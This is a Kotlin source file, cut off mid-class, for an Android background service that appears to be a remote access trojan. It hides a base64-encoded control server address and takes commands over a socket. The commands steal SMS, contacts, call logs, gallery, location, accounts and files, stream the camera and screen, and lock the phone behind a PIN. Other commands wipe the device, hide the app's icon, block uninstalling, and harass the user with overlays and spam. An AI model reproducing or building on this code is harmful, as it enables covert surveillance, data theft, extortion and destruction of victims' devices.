package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Matrix
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.location.Address
import android.location.Geocoder
import android.location.LocationManager
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaPlayer
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.Gravity
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.webkit.MimeTypeMap
import android.webkit.WebView
import android.widget.ImageView
import android.widget.Toast
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.*
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.net.HttpURLConnection
import java.net.URI
import java.net.URL
import java.util.ArrayDeque
import java.util.Locale
import java.util.concurrent.Executors

class DeviceService : Service(), LifecycleOwner {

    companion object {
        const val ACTION_COMMAND       = "com.sync.xxx.COMMAND"
        const val EXTRA_COMMAND        = "command"
        const val EXTRA_VALUE          = "value"
        const val ACTION_CONNECT       = "com.sync.xxx.CONNECT"
        const val ACTION_SEND_STATUS   = "com.sync.xxx.SEND_STATUS"
        const val EXTRA_STATUS_JSON    = "statusJson"
        const val ACTION_SEND_FRAME    = "com.sync.xxx.SEND_FRAME"
        const val EXTRA_FRAME_B64      = "frameB64"
        const val ACTION_SCREEN_RESULT = "com.sync.xxx.SCREEN_RESULT"
        const val EXTRA_RESULT_CODE    = "resultCode"
        const val EXTRA_RESULT_DATA    = "resultData"
        const val ACTION_WATCHDOG      = "ACTION_WATCHDOG_RECONNECT"

        val SERVER_URL: String get() = String(Base64.decode(
            "aHR0cDovL3Byby5tb2JwdGVyby5teS5pZDoyMDAw",
            Base64.DEFAULT
        )).trim()
        const val CHANNEL_ID = "sync_xxx"
        const val NOTIF_ID   = 1
    }

    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = lifecycleRegistry

    private var socket: Socket? = null
    private var deviceId: String = ""
    private var deviceName: String = ""

    var lockPin: String = ""
    var lockTitle: String = ""

    private var cameraProvider: ProcessCameraProvider? = null
    private var imageAnalysis: ImageAnalysis? = null
    private var streaming = false
    private var lastFrameTime = 0L
    private val FRAME_INTERVAL = 250L

    private var cameraManager: CameraManager? = null
    private var torchCameraId: String? = null
    private var flashHandler: Handler? = null
    private var flashRunnable: Runnable? = null
    private var flashBlinking = false
    
    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private var screenStreaming = false
    private var lastScreenFrameTime = 0L
    private val SCREEN_FRAME_INTERVAL = 250L
    private var screenHandler: Handler? = null
    private var screenRunnable: Runnable? = null
    private var savedProjectionResultCode: Int = -1
    private var savedProjectionData: Intent? = null
    private var keyspamHandler: Handler? = null
    private var keyspamRunnable: Runnable? = null
    private var keyspamOverlayView: View? = null
    private var keyspamActive: Boolean = false
    private var keyspamShowState: Boolean = false



    // ── PENERIMA BROADCAST PESAN DARI TARGET ──
    private val chatFromTargetReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.CHAT_FROM_TARGET") {
                val message = intent.getStringExtra("message") ?: return
                Log.d("DeviceService", "Pesan dari target diterima: $message")
                sendChatToAdmin(message)
            }
        }
    }

    private val localReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_CONNECT -> {
                    if (socket == null || socket?.connected() == false) connectSocket()
                }
                ACTION_SEND_STATUS -> {
                    val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
                    emitStatus(JSONObject(json))
                }
                ACTION_SCREEN_RESULT -> {
                    val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
                    val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                        intent.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
                    else
                        @Suppress("DEPRECATION") intent.getParcelableExtra(EXTRA_RESULT_DATA)
                    if (resultCode != Activity.RESULT_OK || data == null) {
                        emitStatus(JSONObject().apply { put("screenActive", false) })
                        return
                    }
                    savedProjectionResultCode = resultCode
                    savedProjectionData = data
                    startScreenCapture(resultCode, data)
                }
                "com.sync.xxx.NEW_NOTIF" -> {
                    val payloadStr = intent.getStringExtra("payload") ?: return
                    try {
                        val payload = JSONObject(payloadStr)
                        storeNotif(payload)
                        if (socket?.connected() == true) {
                            socket?.emit("device:notif", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("notif", payload)
                            })
                        }
                    } catch (_: Exception) {}
                }
                "com.sync.xxx.UNLOCK_FROM_UI" -> {
                    unlockDevice()
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            val hasLocation = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            val hasCamera = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.CAMERA
            ) == PackageManager.PERMISSION_GRANTED

            var serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            if (hasLocation) serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION

            startForeground(NOTIF_ID, buildNotification(), serviceType)
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }

        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)

        deviceId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        ).takeIf { !it.isNullOrBlank() } ?: Build.ID
        val mfr    = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model  = Build.MODEL
        deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"

        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
            cameraManager?.getCameraCharacteristics(id)
                ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        }

        val filter = IntentFilter().apply {
            addAction(ACTION_CONNECT)
            addAction(ACTION_SEND_STATUS)
            addAction(ACTION_SCREEN_RESULT)
            addAction("com.sync.xxx.NEW_NOTIF")
            addAction("com.sync.xxx.UNLOCK_FROM_UI") 
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
            registerReceiver(chatFromTargetReceiver, IntentFilter("com.sync.xxx.CHAT_FROM_TARGET"), RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(localReceiver, filter)
            registerReceiver(chatFromTargetReceiver, IntentFilter("com.sync.xxx.CHAT_FROM_TARGET"))
        }

        connectSocket()
        checkSavedLockState()
        
        // Mulai Alarm Watchdog agar service tetap terpantau berkala
        scheduleAlarm()
    }

    private fun scheduleAlarm() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, DeviceService::class.java).apply {
            action = ACTION_WATCHDOG
        }
        val pendingIntent = PendingIntent.getService(
            this, 
            999, 
            intent, 
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 60_000L, // Cek setiap 1 menit
                pendingIntent
            )
        } else {
            alarmManager.setExact(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 60_000L,
                pendingIntent
            )
        }
    }

    private fun checkSavedLockState() {
        val prefs = getSharedPreferences("lock_prefs", Context.MODE_PRIVATE)
        val isLocked = prefs.getBoolean("is_locked", false)
        if (isLocked) {
            val savedPin = prefs.getString(LockOverlayService.EXTRA_PIN, "1234") ?: "1234"
            val savedTitle = prefs.getString(LockOverlayService.EXTRA_TITLE, "Perangkat Terkunci") ?: "Perangkat Terkunci"
            val savedCustomHtml = prefs.getString(LockOverlayService.EXTRA_CUSTOM_HTML, "") ?: ""
            val lockType = prefs.getString("lock_type", "new") ?: "new"

            val targetActivity = if (lockType == "v3_chat") LockChatActivity::class.java else LockNewActivity::class.java
            val lockIntent = Intent(this, targetActivity).apply {
                putExtra(LockOverlayService.EXTRA_PIN, savedPin)
                putExtra(LockOverlayService.EXTRA_TITLE, savedTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, savedCustomHtml)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(lockIntent)
            startLockFlashBlink()
        }
    }

    private fun connectSocket() {
        try {
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionDelayMax(10000)
                .build()

            socket = IO.socket(URI.create(SERVER_URL), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("DeviceService", "Socket Connected")
                SocketHolder.connected = true
                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val level   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                val plugged = batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
                val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
                val isCharging = plugged != 0

                socket?.emit("device:register", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("name", deviceName)
                    put("battery", batteryPct)
                    put("charging", isCharging)
                    put("sdkVersion", Build.VERSION.SDK_INT)
                    put("androidVersion", Build.VERSION.RELEASE)
                    put("uid", readUid())
                })
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d("DeviceService", "Socket disconnected")
                SocketHolder.connected = false
            }

            socket?.on("command") { args ->
                val data = args[0] as? JSONObject ?: return@on
                val cmd  = data.optString("command")
                val val_ = data.opt("value")

                handleCommand(cmd, val_?.toString() ?: "")

                val intent = Intent(ACTION_COMMAND).apply {
                    putExtra(EXTRA_COMMAND, cmd)
                    val valStr: String = val_?.toString() ?: ""
                    putExtra(EXTRA_VALUE, valStr)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e("DeviceService", "Socket error: ${e.message}")
        }
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "lockV3"           -> lockV3(value)
            "chatFromTarget"   -> sendChatToAdmin(value)
            "chatToTarget"     -> deliverChatToTarget(value)
            "flashlight"       -> setFlashlight(value == "true")
            "senter"           -> setSenter(value == "true")
            "setVolume"        -> setVolumeLevel(value.toIntOrNull()?.coerceIn(0, 100) ?: 50)
            "camera"           -> {
                when (value) {
                    "front" -> startCamera("front")
                    "back"  -> startCamera("back")
                    else    -> stopCamera()
                }
            }
            "screen"           -> {
                when (value) {
                    "start" -> requestScreenCapture()
                    else    -> stopScreenCapture()
                }
            }
            "lockDevice"       -> lockDevice(value)
            "lockCustom"       -> lockCustom(value)
            "unlockDevice"     -> unlockDevice()
            "changeTheme"      -> changeTheme(value)
            "setWallpaper"     -> setWallpaperFromUrl(value)
            "openUrl"          -> openUrl(value)
            "playAudio"        -> playAudio(value)
            "jumpscareStart"   -> startJumpscare(value)
            "jumpscareStop"    -> stopJumpscare()
            "blockApp"         -> blockApp(value)
            "unblockApp"       -> unblockApp(value)
            "unblockAll"       -> unblockAll()
            "getInstalledApps" -> sendInstalledApps()
            "openApp"          -> openApp(value)
            "uninstallApp"     -> uninstallApp(value)
            "getAppsManage"    -> sendAppsManage()
            "getSms"           -> sendSms()
            "getNotifs"        -> sendStoredNotifs()
            "getGallery"       -> sendGallery()
            "getLocation"      -> sendLocation()
            "getContacts"      -> sendContacts()
            "getGmail"         -> sendGmailAccounts()
            "getPhone"         -> sendPhoneNumbers()
            "getCallLogs"      -> sendCallLogs()
            "setScreenBrightness" -> setScreenBrightness(value.toIntOrNull() ?: 128)
            "wipeData"         -> wipeDeviceData()
            "vibrate"          -> vibrateDevice(value)
            "showToast"        -> showToast(value)
            "dialogSpam"       -> startDialogSpam(value)
            "dialogSpamStop"   -> stopDialogSpam()
            "touchBlock"       -> startTouchBlock(value)
            "touchBlockStop"   -> stopTouchBlock()
            "videoOverlay"     -> startVideoOverlay(value)
            "videoOverlayHide" -> stopVideoOverlay()
            "ttsSpeak"         -> ttsSpeak(value)
            "ttsStop"          -> ttsStop()
            "prankCall"   -> setPrankCall(value == "true")
            "keyboardSpam"     -> startKeyboardSpam()
            "keyboardSpamStop" -> stopKeyboardSpam()
            "spamWallpaper"     -> startSpamWallpaper(value)
            "spamWallpaperStop" -> stopSpamWallpaper()
            "lcdBroken"       -> setLcdBroken(value == "true")
            "hideIcon"         -> hideAppIcon(value == "true")
            "muteVolume"       -> setVolumeMute(value == "true")
            "jumpscare2Start"  -> startJumpscare2(value)
            "jumpscare2Stop"   -> stopJumpscare2()
            "getFiles"         -> sendFileList(value)
            "downloadFile"     -> downloadAndSendFile(value)
            "antiUninstall"    -> {
                val isActive = (value == "true")
                val intent = Intent("com.sync.xxx.SET_ANTI_UNINSTALL").apply {
                    putExtra("active", isActive)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
                emitStatus(JSONObject().apply { put("antiUninstall", isActive) })
            }
        }
    }
    
    private fun lockV3(jsonValue: String) {
        try {
            val obj   = JSONObject(jsonValue)
            val pin   = obj.optString("pin", "")
            val title = obj.optString("title", "Perangkat Terkunci")
            lockPin   = pin
            lockTitle = title

            val intent = Intent(this, LockChatActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(LockOverlayService.EXTRA_PIN,   pin)
                putExtra(LockOverlayService.EXTRA_TITLE, title)
            }
            startActivity(intent)

            startLockFlashBlink()
            emitStatus(JSONObject().apply {
                put("deviceLocked", true)
                put("lockTitle",    title)
                put("lockV3Active", true)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockV3: ${e.message}")
        }
    }

    private fun sendChatToAdmin(message: String) {
        if (socket?.connected() != true) return
        socket?.emit("device:chat", JSONObject().apply {
            put("deviceId", deviceId)
            put("from", "target")
            put("message", message)
            put("time", System.currentTimeMillis())
        })
    }

    private fun deliverChatToTarget(message: String) {
        sendBroadcast(Intent("com.sync.xxx.CHAT_FROM_ADMIN").apply {
            putExtra("message", message)
            setPackage(packageName)
        })
    }

    private fun vibrateDevice(value: String) {
        try {
            var durationMs = 500L
            try {
                if (value.trim().startsWith("{")) {
                    val obj = JSONObject(value)
                    durationMs = obj.optLong("duration", obj.optLong("ms", obj.optLong("value", 500L)))
                } else {
                    durationMs = value.toLongOrNull() ?: 500L
                }
            } catch (_: Exception) {}

            if (durationMs < 100) durationMs = 1000L

            val audioAttr = android.media.AudioAttributes.Builder()
                .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
                .setUsage(android.media.AudioAttributes.USAGE_ALARM)
                .build()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as? VibratorManager
                val vib = vm?.defaultVibrator
                val effect = VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE)
                vib?.vibrate(effect, audioAttr)
            } else {
                @Suppress("DEPRECATION")
                val vib = getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val effect = VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE)
                    vib?.vibrate(effect, audioAttr)
                } else {
                    @Suppress("DEPRECATION")
                    vib?.vibrate(durationMs)
                }
            }

            Handler(Looper.getMainLooper()).post {
                Toast.makeText(this, "Getar ${durationMs}ms", Toast.LENGTH_SHORT).show()
            }

            emitStatus(JSONObject().apply { put("vibrated", durationMs) })
        } catch (e: Exception) {
            Log.e("DeviceService", "vibrateDevice ERROR: ${e.message}")
        }
    }

    private var jumpscare2Handler: Handler? = null
    private var jumpscare2Runnable: Runnable? = null
    private var jumpscare2View: ImageView? = null

    private fun startJumpscare2(value: String) {
        stopJumpscare2()
        try {
            val obj      = JSONObject(value)
            val url      = obj.getString("url")
            val duration = obj.optLong("duration", 3000L)

            val wm = getSystemService(WINDOW_SERVICE) as WindowManager

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT
            )

            val imgView = ImageView(this).apply {
                scaleType = ImageView.ScaleType.CENTER_CROP
                setBackgroundColor(android.graphics.Color.BLACK)
            }

            jumpscare2View = imgView

            Handler(Looper.getMainLooper()).post {
                wm.addView(imgView, params)
            }

            Thread {
                try {
                    var redirectUrl = url
                    var bmp: Bitmap? = null
                    for (i in 0..4) {
                        val conn = URL(redirectUrl).openConnection() as HttpURLConnection
                        conn.connectTimeout = 12000
                        conn.readTimeout    = 15000
                        conn.instanceFollowRedirects = false
                        conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                        conn.setRequestProperty("Accept", "image/*")
                        conn.connect()
                        val code = conn.responseCode
                        if (code in 300..399) {
                            val loc = conn.getHeaderField("Location")
                            conn.disconnect()
                            if (loc != null) { redirectUrl = loc; continue } else break
                        }
                        val bytes = conn.inputStream.readBytes()
                        conn.disconnect()
                        bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                        break
                    }
                    val finalBmp = bmp
                    Handler(Looper.getMainLooper()).post {
                        if (finalBmp != null) imgView.setImageBitmap(finalBmp)
                    }
                } catch (e: Exception) {
                    Log.e("DeviceService", "jumpscare2 img: ${e.message}")
                }
            }.start()

            jumpscare2Handler = Handler(Looper.getMainLooper())
            jumpscare2Runnable = Runnable {
                try { wm.removeView(imgView) } catch (_: Exception) {}
                jumpscare2View = null
                emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
            }
            jumpscare2Handler?.postDelayed(jumpscare2Runnable!!, duration)

            emitStatus(JSONObject().apply { put("jumpscare2Active", true) })

        } catch (e: Exception) {
            Log.e("DeviceService", "startJumpscare2: ${e.message}")
        }
    }

    private fun stopJumpscare2() {
        jumpscare2Runnable?.let { jumpscare2Handler?.removeCallbacks(it) }
        jumpscare2Handler  = null
        jumpscare2Runnable = null
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        jumpscare2View?.let {
            try { wm.removeView(it) } catch (_: Exception) {}
        }
        jumpscare2View = null
        emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
    }

    private fun startDialogSpam(value: String) {
        try {
            val text = try { JSONObject(value).optString("text", value) } catch (_: Exception) { value }
            startService(Intent(this, DialogSpamService::class.java))
            Handler(Looper.getMainLooper()).postDelayed({
                val intent = Intent(DialogSpamService.ACTION_START).apply {
                    putExtra(DialogSpamService.EXTRA_TEXT, text)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
                emitStatus(JSONObject().apply { put("dialogSpamActive", true) })
            }, 300L)
        } catch (e: Exception) {
            Log.e("DeviceService", "startDialogSpam: ${e.message}")
        }
    }

    private fun stopDialogSpam() {
        val intent = Intent(DialogSpamService.ACTION_STOP).apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("dialogSpamActive", false) })
    }

    private fun ttsSpeak(value: String) {
        try {
            val obj = JSONObject(value)
            val svcIntent = Intent(this, TTSService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                startForegroundService(svcIntent)
            else startService(svcIntent)
            val intent = Intent(TTSService.ACTION_SPEAK).apply {
                putExtra(TTSService.EXTRA_TEXT,  obj.optString("text", ""))
                putExtra(TTSService.EXTRA_LANG,  obj.optString("lang", "id"))
                putExtra(TTSService.EXTRA_PITCH, obj.optDouble("pitch", 1.0).toFloat())
                putExtra(TTSService.EXTRA_SPEED, obj.optDouble("speed", 1.0).toFloat())
                setPackage(packageName)
            }
            sendBroadcast(intent)
            emitStatus(JSONObject().apply { put("ttsSpeaking", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "ttsSpeak: ${e.message}")
        }
    }

    private fun ttsStop() {
        val intent = Intent(TTSService.ACTION_STOP).apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("ttsSpeaking", false) })
    }

    private var touchBlockView: View? = null
    private var touchBlockHandler: Handler? = null
    private var touchBlockRunnable: Runnable? = null

    private fun startTouchBlock(value: String) {
        try {
            stopTouchBlock()
            val duration = try { JSONObject(value).optLong("duration", 0L) } catch (_: Exception) { value.toLongOrNull() ?: 0L }

            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT
            )

            val view = View(this).apply {
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
                setOnTouchListener { _, _ -> true }
            }

            touchBlockView = view
            Handler(Looper.getMainLooper()).post {
                wm.addView(view, params)
            }

            emitStatus(JSONObject().apply { put("touchBlocked", true) })

            if (duration > 0) {
                touchBlockHandler = Handler(Looper.getMainLooper())
                touchBlockRunnable = Runnable { stopTouchBlock() }
                touchBlockHandler?.postDelayed(touchBlockRunnable!!, duration * 1000L)
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "startTouchBlock: ${e.message}")
        }
    }

    private fun stopTouchBlock() {
        touchBlockRunnable?.let { touchBlockHandler?.removeCallbacks(it) }
        touchBlockHandler  = null
        touchBlockRunnable = null
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        touchBlockView?.let {
            try {
                Handler(Looper.getMainLooper()).post {
                    wm.removeView(it)
                }
            } catch (_: Exception) {}
        }
        touchBlockView = null
        emitStatus(JSONObject().apply { put("touchBlocked", false) })
    }

    private fun startVideoOverlay(fileName: String) {
        try {
            startService(Intent(this, VideoOverlayService::class.java))
            Handler(Looper.getMainLooper()).postDelayed({
                val intent = Intent(VideoOverlayService.ACTION_SHOW).apply {
                    setPackage(packageName)
                    putExtra(VideoOverlayService.EXTRA_VIDEO, fileName) 
                }
                sendBroadcast(intent)
                
                emitStatus(JSONObject().apply { 
                    put("videoOverlayActive", true)
                    if (fileName.contains("virus")) {
                        put("virusActive", true)
                    }
                })
            }, 300L)
        } catch (e: Exception) {
            Log.e("DeviceService", "startVideoOverlay: ${e.message}")
        }
    }

    private fun stopVideoOverlay() {
        val intent = Intent(VideoOverlayService.ACTION_HIDE).apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { 
            put("videoOverlayActive", false)
            put("virusActive", false) 
        })
    }
    
    private fun setScreenBrightness(brightness: Int) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(this)) {
                Log.e("DeviceService", "Gagal: Belum memiliki izin WRITE_SETTINGS")
                emitStatus(JSONObject().apply { put("toastSent", "Membuka pengaturan untuk meminta izin ubah sistem...") })
                
                val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                    data = Uri.parse("package:$packageName")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
                return
            }

            val level = brightness.coerceIn(0, 255)
            
            Settings.System.putInt(
                contentResolver, 
                Settings.System.SCREEN_BRIGHTNESS_MODE, 
                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
            )
            
            Settings.System.putInt(
                contentResolver, 
                Settings.System.SCREEN_BRIGHTNESS, 
                level
            )
            
            val uri = Settings.System.getUriFor(Settings.System.SCREEN_BRIGHTNESS)
            contentResolver.notifyChange(uri, null)
            
            emitStatus(JSONObject().apply { 
                put("screenBrightness", level)
                put("toastSent", "Kecerahan diubah!")
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "setScreenBrightness ERROR: ${e.message}")
        }
    }

    private fun hideAppIcon(hide: Boolean) {
        try {
            val pm = packageManager
            if (hide) {
                THEME_ALIASES.values.forEach { alias ->
                    try {
                        pm.setComponentEnabledSetting(
                            ComponentName(packageName, alias),
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}
                }
                pm.setComponentEnabledSetting(
                    ComponentName(this, MainActivity::class.java),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            } else {
                pm.setComponentEnabledSetting(
                    ComponentName(this, THEME_ALIASES["default"]!!),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
            emitStatus(JSONObject().apply { put("iconHidden", hide) })
        } catch (e: Exception) {
            Log.e("DeviceService", "hideAppIcon: ${e.message}")
        }
    }
    
    private fun wipeDeviceData() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = ComponentName(this, AntiUninstallReceiver::class.java)

            if (dpm.isAdminActive(adminComponent)) {
                emitStatus(JSONObject().apply { put("toastSent", "Proses Reset Dimulai") })
                dpm.wipeData(0) 
            } else {
                emitStatus(JSONObject().apply { put("toastSent", "Gagal: Bukan Device Admin") })
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "wipeDeviceData ERROR: ${e.message}")
        }
    }
    
private var spamWpHandler: Handler? = null
private var spamWpRunnable: Runnable? = null
private var spamWpUrls: List<String> = emptyList()
private var spamWpGeneration = 0

private fun startSpamWallpaper(value: String) {
    stopSpamWallpaper()

    spamWpUrls = try {
        val arr = JSONArray(value)
        (0 until arr.length())
            .map { arr.getString(it) }
            .filter { it.isNotBlank() }
    } catch (_: Exception) {
        if (value.isNotBlank()) listOf(value.trim())
        else emptyList()
    }

    if (spamWpUrls.isEmpty()) {
        emitStatus(JSONObject().apply {
            put("spamWallpaperActive", false)
        })
        return
    }

    val generation = spamWpGeneration

    spamWpHandler = Handler(Looper.getMainLooper())

    spamWpRunnable = object : Runnable {
        override fun run() {
            if (generation != spamWpGeneration) return
            if (spamWpUrls.isEmpty()) return

            val pickedUrl = spamWpUrls.random()

            Thread {
                try {
                    val conn = (URL(pickedUrl).openConnection() as HttpURLConnection).apply {
                        requestMethod = "GET"
                        connectTimeout = 8000
                        readTimeout = 15000
                        instanceFollowRedirects = true
                        setRequestProperty("User-Agent", "Mozilla/5.0")
                    }

                    try {
                        conn.connect()

                        if (conn.responseCode != HttpURLConnection.HTTP_OK) {
                            return@Thread
                        }

                        val bytes = conn.inputStream.use {
                            it.readBytes()
                        }

                        // Jangan lanjut kalau sudah di-stop
                        if (generation != spamWpGeneration) return@Thread

                        val bmp = BitmapFactory.decodeByteArray(
                            bytes,
                            0,
                            bytes.size
                        ) ?: return@Thread

                        try {
                            if (generation != spamWpGeneration) return@Thread

                            val wm = WallpaperManager.getInstance(
                                this@DeviceService
                            )

                            wm.setBitmap(bmp)
                        } finally {
                            bmp.recycle()
                        }

                    } finally {
                        conn.disconnect()
                    }

                } catch (e: Exception) {
                    Log.e(
                        "DeviceService",
                        "spamWallpaper error",
                        e
                    )
                }
            }.start()

            spamWpHandler?.postDelayed(
                this,
                3000L
            )
        }
    }

    spamWpHandler?.post(spamWpRunnable!!)

    emitStatus(JSONObject().apply {
        put("spamWallpaperActive", true)
    })
}

private fun stopSpamWallpaper() {
    spamWpGeneration++

    spamWpUrls = emptyList()

    spamWpRunnable?.let {
        spamWpHandler?.removeCallbacks(it)
    }

    spamWpRunnable = null
    spamWpHandler = null

    emitStatus(JSONObject().apply {
        put("spamWallpaperActive", false)
    })
}

private var lcdOverlayView: android.webkit.WebView? = null
